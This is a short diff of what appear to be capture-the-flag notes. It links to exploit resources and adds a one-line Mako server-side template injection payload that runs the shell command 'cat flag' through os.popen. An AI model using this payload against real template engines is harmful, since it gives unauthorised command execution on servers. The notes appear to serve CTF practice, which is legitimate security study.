@@ -12,6 +12,7 @@ https://github.com/nixawk/labs/blob/master/CVE-2015-5531/exploit.py
 
 FOR SHARK
 https://0x1.gitlab.io/web-security/Server-Side-Template-Injection/#mako
+<% import os; x=os.popen('cat flag').read(); %> ${x}
 
 for unit
 https://www.exploit-db.com/exploits/50702
